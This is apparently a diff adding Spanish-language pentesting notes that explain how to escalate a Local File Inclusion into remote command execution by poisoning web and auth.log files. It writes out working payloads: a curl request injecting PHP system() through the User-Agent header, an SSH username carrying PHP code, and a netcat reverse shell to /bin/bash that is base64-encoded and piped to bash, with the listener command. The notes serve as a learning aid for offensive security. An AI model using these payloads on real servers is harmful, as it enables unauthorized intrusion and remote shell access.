@@ -1,0 +1,50 @@
+A traves de un LFI podemos convertirlo en un RSE (Remote Command execution). 
+
+    * COMO SE EXPLOTA?:
+
+        1 = A traves de la variable "filename o filetype etc" [Todo desde un url o burpsuit] podemos apuntar hacia un PATH.
+        2 = Para ejecutar esta vulnerabilidad, a través de un LFI tenemos que tener la capacidad de leer un archivo en
+            formato log.
+            Estos archivos lo normal esque tengan permisos restringidos, pero aveces son exportados a ficheros con permisos 
+            de lectura para otros.
+            De esta forma envenenamos el log para injectar nuestros propios comandos.
+
+        3 = Una ved encontramos el archivo log y podemos ver las peticiones impresas en el, una cosa que podemos hacer en la siguiente 
+            petición es retocar las caveceras.
+        4 = Copiamos la cabecera
+        5 = Con el comando curl:
+
+            curl "URL_log" -H "User-Agent: <?php system('whoami'); ?>"
+
+                De esta forma estamos ejecutando comandos a nivel de sistema.
+
+    * USANDO EL auth.log
+
+        El archivo "auth.log" es un log, en el cual aparecen errores y peticiones erroneas, podriamos aprovechar esto para inyectar comandos
+        por ejemplo utilizando una conexion ssh con contraseña fallida, cambiando el usuario por un script en PHP, por ejemplo:
+
+            ssh <?php system('whoami'); ?>@localhost 
+
+        Aunque la respuesta sea incorreecta, si bolvemos a abrir el archivo auth.log, veremos la ejecución de el comando.
+
+        Esto nos permite también la posivilidad de injectar una reverse shell. 
+
+        @@@ Ejemplo de explotación @@@
+
+            * Podriamos crearnos un comando que inicie una reverse shell con netcat de la siguiente forma:
+
+                nc -e /bin/bash 127.0.0.1 4646
+            
+            * Aveces esto puede fallar y podriamos hacerlo pasandolo a "base 64"
+
+                echo "nc -e /bin/bash 127.0.0.1 4646" | base64 
+
+            * Copiamos el codigo que nos de y agregamos lo siguiente:
+
+                echo "Codigo base 64" | base64 -d | bash 
+                    
+                    * Introducimos el comando dentro de System() en el script php.
+
+            * Actualizamos la web (el log) y ya deberiamos estar dentro con netcat (nc -lvnp puerto)
+
+
